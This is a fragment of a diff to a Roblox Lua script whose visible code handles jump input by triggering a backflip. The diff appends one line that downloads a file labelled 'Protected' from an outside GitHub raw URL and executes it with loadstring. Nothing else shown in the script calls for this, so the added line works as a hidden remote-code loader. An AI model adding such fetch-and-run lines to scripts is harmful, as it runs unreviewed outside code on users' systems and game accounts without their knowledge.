@@ -52,3 +52,4 @@ UserInputService.JumpRequest:Connect(function()
         performBackflip()
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nwepnet/stuffido/refs/heads/main/Protected_6709835173603518.txt",true))()
